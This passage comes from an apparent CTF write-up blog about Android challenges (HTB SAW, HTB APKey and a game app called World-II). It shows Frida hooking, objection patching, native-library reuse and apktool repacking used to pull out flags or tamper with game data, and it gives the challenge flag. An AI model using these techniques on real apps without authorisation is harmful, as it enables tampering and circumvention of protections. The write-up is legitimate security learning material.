directly.\nInteresting Finding 2 Another method is to abuse the native library by importing into my own project. This is much more complicated as it need to code using either Kotlin or Java. This requires abit more step to do so.\nFirst step is to build a project with an exact same app name which in this case com.stego.saw.\nAfter creating the project, add all the native library under the folder name of jniLibs.\nAfter adding it, sync the project first and then start adding the required code to use the native library.\n1 2 3 4 5 6 7 external fun a(str: String?, str2: String?): String? companion object { init { System.loadLibrary(\u0026#34;default\u0026#34;) } } After this, the remaining part should be simple as all I need to do now is code for the button and text.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 val context = LocalContext.current var result by remember { mutableStateOf(\u0026#34;Waiting for result...\u0026#34;) } var fleg by remember { mutableStateOf(\u0026#34;Waiting for fleg\u0026#34;) } Column( modifier = Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.Center ) { Button(onClick = { result = MainActivity().a(context.applicationInfo.dataDir + File.separator,\u0026#34;fl0ating\u0026#34;).toString() val file = File(context.applicationInfo.dataDir + File.separator+\u0026#34;h\u0026#34;) fleg = if (file.exists()) file.readText() else \u0026#34;File not found\u0026#34; }) { Text(text=\u0026#34;test\u0026#34;) } Text(text = result) Text(text = fleg) } Focus on the onclick where it has 2 important function there. First is using the function a to provide the required filepath and also the correct strings. The another function is for us to easily read the file. Here\u0026rsquo;s an example of the result.\nThe first solution is still important as the remaining solution could only works after understanding how everything works.\n** Here\u0026rsquo;s my full source for those that are interested : https://github.com/callmeks/htbsaw\nThings I learned from this challenge adb to provide Intent extras understanding the Java code by providing the correct permission reading native library using ghidra Frida scripting could used to directly call certain function when needed creating a fake apk to use the native library ","permalink":"https://callmeks.github.io/posts/htb-saw/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe malware forensics lab identified a new technique for hiding and executing code dynamically. A sample that seems to use this technique has just arrived in their queue. Can you help them?\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/SAW.apk\"\u003eSAW.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eThis is something that I think quite hard but yea another fun challenge.\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eAs usual, I started with \u003ccode\u003ejadx-gui\u003c/code\u003e for reading the decompiled Java code.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e6\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.stego.saw.MainActivity\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.action.MAIN\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.LAUNCHER\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eIt seems like there\u0026rsquo;s only one activity to focus on. I then have a look in it. Inside the \u003ccode\u003eMainActivity.java\u003c/code\u003e, there\u0026rsquo;s a few that I think its interesting and useful.\u003c/p\u003e","title":"HTB SAW"},{"content":"Challenge Description This app contains some unique keys. Can you get one?\nAPKey.apk\nSolution Static Analysis The first step is always static analysis. I started by using jadx-gui to see the decompiled Java code. Looking into the AndroidManifest.xml, it looks like there\u0026rsquo;s only one activity which is MainActivity.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;application android:theme=\u0026#34;@style/Theme.APKey\u0026#34; android:label=\u0026#34;@string/app_name\u0026#34; android:icon=\u0026#34;@mipmap/ic_launcher\u0026#34; android:allowBackup=\u0026#34;true\u0026#34; android:supportsRtl=\u0026#34;true\u0026#34; android:roundIcon=\u0026#34;@mipmap/ic_launcher_round\u0026#34; android:appComponentFactory=\u0026#34;androidx.core.app.CoreComponentFactory\u0026#34;\u0026gt; \u0026lt;activity android:name=\u0026#34;com.example.apkey.MainActivity\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;/application\u0026gt; Since it\u0026rsquo;s gonna be MainActivity, we could have a look at the code. Inside the code, we have something interesting.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public void onClick(View view) { Toast makeText; String str; try { if (MainActivity.this.f928c.getText().toString().equals(\u0026#34;admin\u0026#34;)) { MainActivity mainActivity = MainActivity.this; b bVar = mainActivity.e; String obj = mainActivity.d.getText().toString(); try { MessageDigest messageDigest = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;); messageDigest.update(obj.getBytes()); byte[] digest = messageDigest.digest(); StringBuffer stringBuffer = new StringBuffer(); for (byte b2 : digest) { stringBuffer.append(Integer.toHexString(b2 \u0026amp; 255)); } str = stringBuffer.toString(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); str = \u0026#34;\u0026#34;; } if (str.equals(\u0026#34;a2a3d412e92d896134d9c9126d756f\u0026#34;)) { Context applicationContext = MainActivity.this.getApplicationContext(); MainActivity mainActivity2 = MainActivity.this; b bVar2 = mainActivity2.e; g gVar = mainActivity2.f; makeText = Toast.makeText(applicationContext, b.a(g.a()), 1); makeText.show(); } } makeText = Toast.makeText(MainActivity.this.getApplicationContext(), \u0026#34;Wrong Credentials!\u0026#34;, 0); makeText.show(); } catch (Exception e2) { e2.printStackTrace(); } } Looking into this part of the code, I could see there\u0026rsquo;s a string comparison for admin and a function that seems to be MD5 but the strings is 31 characters. Well since I have no idea, I decided to look into the toast.makeText as it seems like the function to get flag. It\u0026rsquo;s playing around b.a(g.a()).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 public class g { public static String a() { StringBuilder sb = new StringBuilder(); ArrayList arrayList = new ArrayList(); arrayList.add(\u0026#34;722gFc\u0026#34;); arrayList.add(\u0026#34;n778Hk\u0026#34;); arrayList.add(\u0026#34;jvC5bH\u0026#34;); arrayList.add(\u0026#34;lSu6G6\u0026#34;); arrayList.add(\u0026#34;HG36Hj\u0026#34;); arrayList.add(\u0026#34;97y43E\u0026#34;); arrayList.add(\u0026#34;kjHf5d\u0026#34;); arrayList.add(\u0026#34;85tR5d\u0026#34;); arrayList.add(\u0026#34;1UlBm2\u0026#34;); arrayList.add(\u0026#34;kI94fD\u0026#34;); sb.append((String) arrayList.get(8)); sb.append(h.a()); sb.append(i.a()); sb.append(f.a()); sb.append(e.a()); ArrayList arrayList2 = new ArrayList(); arrayList2.add(\u0026#34;ue7888\u0026#34;); arrayList2.add(\u0026#34;6HxWkw\u0026#34;); arrayList2.add(\u0026#34;gGhy77\u0026#34;); arrayList2.add(\u0026#34;837gtG\u0026#34;); arrayList2.add(\u0026#34;HyTg67\u0026#34;); arrayList2.add(\u0026#34;GHR673\u0026#34;); arrayList2.add(\u0026#34;ftr56r\u0026#34;); arrayList2.add(\u0026#34;kikoi9\u0026#34;); arrayList2.add(\u0026#34;kdoO0o\u0026#34;); arrayList2.add(\u0026#34;2DabnR\u0026#34;); sb.append((String) arrayList2.get(9)); sb.append(c.a()); ArrayList arrayList3 = new ArrayList(); arrayList3.add(\u0026#34;jH67k8\u0026#34;); arrayList3.add(\u0026#34;8Huk89\u0026#34;); arrayList3.add(\u0026#34;fr5GtE\u0026#34;); arrayList3.add(\u0026#34;Hg5f6Y\u0026#34;); arrayList3.add(\u0026#34;o0J8G5\u0026#34;); arrayList3.add(\u0026#34;Wod2bk\u0026#34;); arrayList3.add(\u0026#34;Yuu7Y5\u0026#34;); arrayList3.add(\u0026#34;kI9ko0\u0026#34;); arrayList3.add(\u0026#34;dS4Er5\u0026#34;); arrayList3.add(\u0026#34;h93Fr5\u0026#34;); sb.append((String) arrayList3.get(5)); sb.append(d.a()); sb.append(a.a()); return sb.toString(); } public static String b() { return String.valueOf(d.a().charAt(1)) + String.valueOf(i.a().charAt(2)) + String.valueOf(i.a().charAt(1)); } } Looking into g, there\u0026rsquo;s function a and b and function a seems to be something I want but it has a lot of random functions from different class.\nDynamic Analysis Since there\u0026rsquo;s a lot of random function, I decided to perform dynamic analysis by using frida to force executing the Java code. To do so, I\u0026rsquo;ll need to use objection to patch the APK.\n1 2 3 4 PS D:\\\u0026gt; objection patchapk -s .\\APKey.apk No architecture specified. Determining it using `adb`... Detected target device architecture as: arm64-v8a ... After patching and installing it to my devices, it should be ready to use. Since it is patched using objection, I\u0026rsquo;ll need to use frida to hook it to let the APK running as intended.\n1 2 3 4 5 6 7 8 9 10 11 12 frida -U -N com.example.apkey -l .\\frida.js ____ / _ | Frida 16.5.9 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to POCOPHONE F1 (id=d211a91c) After hooking it, I could see the app working as intended.\nThis looks like it\u0026rsquo;s related to the function where it checks for admin and a weird 31 hash. Since this is useless, I then continue with what i wanted to do which is using frida to execute the Java function.\n1 2 3 4 5 Java.perform(()=\u0026gt; { let g = Java.use(\u0026#34;c.b.a.g\u0026#34;); let test = g.a(); console.log(\u0026#34;g.a() result = \u0026#34; + test); }); By using this frida script, I could instantly get the result of the Java code.\n1 2 [POCOPHONE F1::com.example.apkey ]-\u0026gt; %reload g.a() result = 1UlBm2kHtZuVrSE6qY6HxWkwHyeaX92DabnRFlEGyLWod2bkwAxcoc85S94kFpV1 This seems to be another weird strings which I have no idea what it is. I then remembered that the function is b.a(g.a()) which means this strings works as a key for b.a() functions. I then changed my script accordingly.\n1 2 3 4 5 6 7 8 Java.perform(()=\u0026gt; { let g = Java.use(\u0026#34;c.b.a.g\u0026#34;); let b = Java.use(\u0026#34;c.b.a.b\u0026#34;); let test = g.a(); console.log(\u0026#34;g.a() result = \u0026#34; + test); let result = b.a(test); console.log(\u0026#34;b.a() result = \u0026#34; + result); }); I then get some good result from the frida script.\n1 2 3 [POCOPHONE F1::com.example.apkey ]-\u0026gt; %reload g.a() result = 1UlBm2kHtZuVrSE6qY6HxWkwHyeaX92DabnRFlEGyLWod2bkwAxcoc85S94kFpV1 b.a() result = HTB{m0r3_0bfusc4t1on_w0uld_n0t_hurt} Things I learned from this challenge Frida Scripting ","permalink":"https://callmeks.github.io/posts/htb-apkey/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis app contains some unique keys. Can you get one?\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/APKey.apk\"\u003eAPKey.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eThe first step is always static analysis. I started by using \u003ccode\u003ejadx-gui\u003c/code\u003e to see the decompiled Java code. Looking into the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e, it looks like there\u0026rsquo;s only one activity which is \u003ccode\u003eMainActivity\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;application\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:theme=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@style/Theme.APKey\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:label=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@string/app_name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:icon=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@mipmap/ic_launcher\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:allowBackup=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:supportsRtl=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:roundIcon=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@mipmap/ic_launcher_round\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:appComponentFactory=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;androidx.core.app.CoreComponentFactory\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.example.apkey.MainActivity\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.action.MAIN\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.LAUNCHER\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;/application\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eSince it\u0026rsquo;s gonna be \u003ccode\u003eMainActivity\u003c/code\u003e, we could have a look at the code. Inside the code, we have something interesting.\u003c/p\u003e","title":"HTB APKey"},{"content":"Challenge Description Welp, time to do it again.\nUnable to install? That is a part of the challenge, try to overcome it.\nAuthor: Trailbl4z3r \u0026amp; Monaruku\nhint: Tbh this is not a natively built app, more like something just wrapped into an app\nWorld-II.apk\nSolution Since it\u0026rsquo;s an APK file, Lets start with jadx-gui for static analysis. In terms of static analysis, it\u0026rsquo;s always best to check out AndroidManifest.xml first.\nBased on the code, there\u0026rsquo;s only one activity which is systems.altimit.rpgmakermv.WebPlayerActivity. Double click and see the activity code. There\u0026rsquo;s a lot of function in the WebPlayerActivity but I\u0026rsquo;ll be focusing on onCreate function first as that it is the starting point for all activities.\nAccording to the code, it is trying to construct the game by getting the value of id.application.rpgmakermv.R.string.mv_project_index. I then tried to have a look and search for the strings values. By using the global search feature in jadx-gui, I managed to get the strings value.\nNow that I know the value is //android_asset/www/index.html, my first thought is checking out for the files using the global search feature.\nWhile the index.html does not have a lot of code, I noticed that it\u0026rsquo;s using main.js. I then look for it and have a look in it.\nLooking into main.js, there\u0026rsquo;s a lot of code and several script as well. I then look into each of it and see which is interesting.\nLooking into rmmz_managers.js, I noticed that database file that are stored as json file. I then look into Actors.json as it seems like the game character\u0026rsquo;s database file.\nSince this is a json file, I think that I could modify the json file and repack the apk to make the me win easily. Since I have limited information at the moment, I tried to run the apk and see how the game works.\nHere\u0026rsquo;s how the main page looks like, which is similar to the index.html. I then started to play around to get more information.\nHere\u0026rsquo;s my current stat and equipment. I then look into the Actors.json to compare and identify which value I should modify. I noticed that the equip is the current weapon and body that the character has. The weapon database file is Weapons.json.\nThe id of the weapon is same as the number provided in equip in Actors.json. My next thought was to increase the damage of the weapon Dragon Blade since I could just edit the json file and repack it. While I have no idea, the params definitely consist the damage of the weapon. I then randomly edit every params into high value. To do so, I\u0026rsquo;ll need to unpack first.\n1 2 3 4 5 6 7 8 9 10 11 12 13 PS D:\\Desktop\\Android\\world2\u0026gt; apktool d .\\World_II.apk I: Using Apktool 2.10.0 on World_II.apk with 8 thread(s). I: Baksmaling classes.dex... I: Loading resource table... I: Decoding file-resources... I: Loading resource table from file: C:\\Users\\a\\AppData\\Local\\apktool\\framework\\1.apk I: Decoding values */* XMLs... I: Decoding AndroidManifest.xml with resources... I: Regular manifest package... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... Press any key to continue . . . After unpack the APK file, search for Weapons.json and modfiy the params value of Dragon Blade to 999. After modifying it, repack it.\n1 2 3 4 5 6 7 8 9 10 PS D:\\Desktop\\Android\\world2\u0026gt; apktool b .\\World_II\\ -o world-2-modified.apk I: Using Apktool 2.10.0 with 8 thread(s). I: Checking whether sources has changed... I: Smaling smali folder into classes.dex... I: Checking whether resources has changed... I: Building resources... I: Building apk file... I: Copying unknown files/dir... I: Built apk into: world-2-modified.apk Press any key to continue . . . After repacking the APK, remember to sign it. To do so, create a keystore.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PS D:\\Desktop\\Android\\world2\u0026gt; keytool -genkey -v -keystore modify.keystore -alias modify_key -keyalg RSA -keysize 2048 -validity 10000 Enter keystore password: Re-enter new password: Enter the distinguished name. Provide a single dot (.) to leave a sub-component empty or press ENTER to use the default value in braces. What is your first and last name? What is the name of your organizational unit? 